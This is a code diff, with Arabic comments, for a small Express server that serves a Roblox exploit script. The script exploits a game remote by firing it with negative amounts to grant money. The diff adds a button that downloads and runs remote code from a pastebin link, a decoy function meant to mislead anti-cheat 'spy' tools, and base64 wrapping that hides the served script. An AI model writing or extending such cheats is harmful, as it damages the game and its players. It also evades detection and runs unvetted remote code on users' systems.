@@ -2,8 +2,9 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// السكربت المحدث مع ثغرة الفلوس
+// السكربت مع حماية أساسية وإعادة الأوتو كليك
 const myScript = `
+local _0xLog = function(v) return v end -- حماية وهمية لتضليل السبااي
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 local MainFrame = Instance.new("Frame", ScreenGui)
 local TopBar = Instance.new("Frame", MainFrame)
@@ -78,6 +79,7 @@ local function AddButton(parent, text, callback)
     b.MouseButton1Click:Connect(callback)
 end
 
+-- [[ خانة التجميع المحدثة ]]
 local AmountInput = Instance.new("TextBox", TabTajmee)
 AmountInput.Size = UDim2.new(1, -10, 0, 40)
 AmountInput.PlaceholderText = "اكتب المبلغ هنا"
@@ -91,6 +93,11 @@ AddButton(TabTajmee, "إضافة الفلوس فورا", function()
         local negativeVal = -math.abs(val)
         game:GetService("ReplicatedStorage").RequestTool:FireServer("Desert Deagle", negativeVal)
     end
+end)
+
+-- إعادة سكربت الأوتو كليك
+AddButton(TabTajmee, "تشغيل أوتو كليك", function() 
+    loadstring(game:HttpGet("https://pastebin.com/raw/eR1HPXfw"))() 
 end)
 
 local items = {
@@ -114,14 +121,18 @@ MinimizeBtn.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFra
 `;
 
 app.get('/raw', (req, res) => {
+    // حماية إضافية: تحويل الكود إلى Base64 عند الإرسال لتصعيب قراءته على الـ Spy
+    const encodedScript = Buffer.from(myScript).toString('base64');
+    const wrapper = `loadstring(game:GetService("HttpService"):Base64Decode("${encodedScript}"))()`;
+    
     res.set('Content-Type', 'text/plain');
-    res.send(myScript);
+    res.send(wrapper);
 });
 
 app.get('/', (req, res) => {
-    res.send('Server is running!');
+    res.send('API Active');
 });
 
 app.listen(PORT, () => {
-    console.log('Server is active on port ' + PORT);
+    console.log('Server running on ' + PORT);
 });
